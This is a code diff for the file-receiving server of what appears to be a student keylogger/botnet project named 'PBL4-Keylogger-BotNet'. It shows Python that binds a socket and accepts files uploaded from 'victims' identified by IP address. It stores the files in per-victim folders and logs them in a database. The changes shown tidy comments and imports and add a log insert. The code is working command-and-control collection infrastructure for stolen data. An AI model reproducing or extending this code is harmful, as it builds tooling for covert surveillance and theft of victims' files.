@@ -1,9 +1,7 @@
 import os
 import socket
 from datetime import datetime
-from database.connect.connect import connect_to_database, insert_file_info, close_connection
-from database.connect.connect import get_victimid_by_ip  # Đảm bảo import hàm get_victimid_by_ip
-
+from database.connect.connect import *
 def save_file(conn, filename, filesize, save_directory):
     """Lưu tệp nhận được vào thư mục."""
     try:
@@ -27,25 +25,21 @@ def receive_file(host, ip, port, save_directory='PBL4-Keylogger-BotNet/middleman
     """
     Nhận tệp qua socket, lưu vào thư mục và ghi thông tin vào cơ sở dữ liệu.
     """
-    # Lấy victim_id từ IP
     victim_id = get_victimid_by_ip(ip)
     if victim_id is None:
         print(f"Không tìm thấy nạn nhân với IP {ip}.")
         return
 
-    # Tạo thư mục lưu tệp nếu chưa tồn tại
-    save_directory = os.path.join(save_directory, str(victim_id))  # Tạo thư mục cho từng victim_id
+    save_directory = os.path.join(save_directory, str(victim_id)) 
     if not os.path.exists(save_directory):
         os.makedirs(save_directory)
         print(f"Tạo thư mục {save_directory}")
 
-    # Kết nối đến cơ sở dữ liệu
     db_connection = connect_to_database()
     if not db_connection:
         print("Không thể kết nối cơ sở dữ liệu. Thoát chương trình.")
         return
 
-    # Thiết lập socket để nhận tệp
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind((host, port))
         s.listen()
@@ -72,6 +66,7 @@ def receive_file(host, ip, port, save_directory='PBL4-Keylogger-BotNet/middleman
                     # Lưu thông tin tệp vào cơ sở dữ liệu
                     upload_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                     insert_file_info(db_connection, victim_id, filename, filepath, upload_time)
+                    insert_log(db_connection, victim_id, "File", upload_time)
                 except Exception as e:
                     print(f"Lỗi khi nhận tệp: {e}")
                     break
